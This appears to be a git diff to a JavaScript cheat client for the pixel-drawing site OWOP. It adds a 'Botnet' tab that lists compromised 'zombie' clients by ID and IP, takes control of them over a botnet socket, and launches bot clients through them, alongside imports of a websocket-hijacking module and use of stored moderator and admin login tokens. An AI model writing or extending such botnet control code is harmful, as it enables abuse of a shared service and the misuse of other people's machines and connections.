@@ -6,6 +6,7 @@ import OJS from "./OJS.js";
 import { bots } from "./sharedState.js";
 import socket from "./ws-hijacking.js";
 import { getLocalPlayer } from "./utils.js";
+import { botnetSocket } from "./botnet.js";
 
 function initUI() {
     const UI = new AimwareUI("owopfuck.v2", {
@@ -68,12 +69,12 @@ function initUI() {
                 adminlogin: config.getValue("AutoLogin") ? localStorage.adminlogin : undefined,
                 ws: new WebSocket(OWOP.net.currentServer.url, null, {
 					headers: {
-						'Origin': location.origin,
-						'Referer': document.referrer
+						"Origin": location.origin,
+						"Referer": document.referrer
 					},
 					origin: location.origin
 				}),
-                simpleChunks: true
+                simpleChunks: false
             });
             bot.on("id", () => bots.push(bot));
             bot.on("close", () => {
@@ -127,6 +128,78 @@ function initUI() {
     }
     {
         const Botnet = UI.addTab("Botnet");
+
+        const BotnetMain = Botnet.addSection("!Bots");
+
+        let zombies = [];
+
+        BotnetMain.addButton("Control All", () => {
+            zombies.forEach(zombie => {
+                botnetSocket.emit("control", zombie.id);
+            });
+        });
+        BotnetMain.addButton("Connect", () => botnetSocket.connect());
+        BotnetMain.addButton("Disconnect", () => botnetSocket.close());
+
+        const zombiesTable = BotnetMain.addTable(["ID", "IP", "CONTROL", "ACTION"]);
+
+        botnetSocket.on("list", list => {
+            zombies = list;
+            const currentIds = list.map(item => item.id.toString());
+            const existingIds = Array.from(zombiesTable.tbody.getElementsByTagName("tr")).map(row => row.cells[0].textContent);
+
+            existingIds.forEach(id => {
+                if (!currentIds.includes(id)) {
+                    zombiesTable.removeRow({ ID: id });
+                }
+            });
+
+            list.forEach(item => {
+                const existingRow = zombiesTable.findRow({ ID: item.id.toString() });
+                let actionButtons = `<button id="control-${item.id}" class="aimware-button">Control</button>`;
+                if (item.controller) {
+                    actionButtons += ` <button id="connect-${item.id}" class="aimware-button">Connect</button>`;
+                }
+
+                const rowData = {
+                    ID: item.id.toString(),
+                    IP: item.ip.split(',').join(' | '),
+                    CONTROL: item.controller ? "Yes" : "No",
+                    ACTION: actionButtons
+                }
+
+                if (existingRow) {
+                    zombiesTable.editRow({ ID: item.id.toString() }, rowData);
+                } else {
+                    zombiesTable.addRow(rowData);
+                }
+
+                document.getElementById(`control-${item.id}`).addEventListener("click", () => {
+                    botnetSocket.emit("control", item.id);
+                });
+
+                if (item.controller) {
+                    document.getElementById(`connect-${item.id}`).addEventListener("click", () => {
+                        botnetSocket.emit("con", item.id, OWOP.options.serverAddress[0].url, "arraybuffer");
+
+                        const bot = new OJS.Client({
+                            nickname: config.getValue("Bot Nickname"),
+                            autoreconnect: config.getValue("Bot AutoReconnect"),
+                            world: OWOP.world.name,
+                            unsafe: location.host == "augustberchelmann.com",
+                            modlogin: config.getValue("AutoLogin") ? localStorage.modlogin : undefined,
+                            adminlogin: config.getValue("AutoLogin") ? localStorage.adminlogin : undefined,
+                            simpleChunks: false,
+                            zombie: item.id
+                        });
+                        bot.on("id", () => bots.push(bot));
+                        bot.on("close", () => {
+                            bots.splice(bots.indexOf(bot), 1);
+                        });
+                    });
+                }
+            });
+        });
     }
     {
         const Proxy = UI.addTab("Proxy");
